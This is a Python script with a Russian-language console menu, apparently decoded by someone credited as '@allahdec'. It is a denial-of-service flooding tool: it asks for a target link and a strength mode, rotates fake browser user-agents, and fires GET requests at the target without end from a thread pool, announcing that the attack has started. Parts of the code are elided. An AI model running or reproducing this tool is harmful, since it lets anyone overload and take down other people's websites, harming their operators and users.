...
import concurrent.futures  #Декоднул @allahdec.
...
print(colored("Меню", "magenta"))
print(colored("├ Для выхода используйте [CTRL + Z]", "magenta"))
print(colored("└ После чего введите [python main.py]", "magenta"))

colorama.init(autoreset=True)  

def dos1():  #Декоднул @allahdec.
    try:  #Декоднул @allahdec.
        def generate_user_agent():  #Декоднул @allahdec.
            versions = [
		...
		"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
            ...
            return user_agent  #Декоднул @allahdec.

        def make_request(url):  #Декоднул @allahdec.
            headers = {
                'User-Agent': generate_user_agent()
            }
            try:  #Декоднул @allahdec.
                response = requests.get(url, headers=headers)
                print(colored(f"\nАтака началась\n└ Cостояние сайта: {response.status_code}", "magenta"))
            except requests.exceptions.RequestException as e:  #Декоднул @allahdec.
                print(colored(f"Ошибка при запросе: {e}", "magenta"))

        def dos():  #Декоднул @allahdec.
            url = input(colored(f"Введите ссылку: ", "magenta"))
            power = input(colored(f"Режимы DoS: \n├ [1] - Слабый\n├ [2] - Средний\n└ [3] - Мощный\nВведите режим: ", "magenta"))
           
            if power not in ("1", "2", "3"):  #Декоднул @allahdec.
                print(colored(f"Некорректный выбор режима\n└ Будет выбран режим по умолчанию [Средний]", "magenta"))
                power = "2"
            ...
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:  #Декоднул @allahdec.
                while True:  #Декоднул @allahdec.
                    executor.submit(make_request, url)

        dos()
    except KeyboardInterrupt:  #Декоднул @allahdec.
        print(colored(f"Атака остановлена пользователем", "magenta"))
    except Exception as e:  #Декоднул @allahdec.
        print(colored(f"Произошла ошибка: {e}", "magenta"))
